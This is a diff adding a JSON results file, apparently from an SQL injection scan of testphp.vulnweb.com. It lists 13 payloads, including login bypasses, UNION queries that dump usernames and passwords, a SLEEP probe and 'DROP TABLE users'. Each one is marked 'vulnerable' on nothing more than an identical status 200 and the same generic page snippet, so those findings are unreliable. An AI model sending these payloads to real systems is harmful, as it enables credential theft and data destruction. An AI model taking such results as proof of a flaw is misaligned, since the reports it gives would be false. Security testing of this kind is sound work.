@@ -1,0 +1,97 @@
+{
+    "results": [
+        [
+            {
+                "payload": "' OR 1=1 --",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=' OR 1=1 --",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "' OR 'a'='a",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=' OR 'a'='a",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "' UNION SELECT NULL, username, password FROM users --",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=' UNION SELECT NULL, username, password FROM users --",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "'; DROP TABLE users --",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input='; DROP TABLE users --",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "1' OR '1'='1",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=1' OR '1'='1",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "admin'--",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=admin'--",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "' AND 1=CONVERT(int, '1') --",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=' AND 1=CONVERT(int, '1') --",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "1' AND SLEEP(5) --",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=1' AND SLEEP(5) --",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "' UNION SELECT NULL, group_concat(username, ':', password) FROM users --",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=' UNION SELECT NULL, group_concat(username, ':', password) FROM users --",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "' OR 1=1 LIMIT 1,1 --",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=' OR 1=1 LIMIT 1,1 --",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            },
+            {
+                "payload": "' AND 1=1 UNION SELECT 1,2,3 --",
+                "status": "vulnerable",
+                "url": "http://testphp.vulnweb.com?input=' AND 1=1 UNION SELECT 1,2,3 --",
+                "status_code": 200,
+                "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd"
+            }
+        ]
+    ]
+}
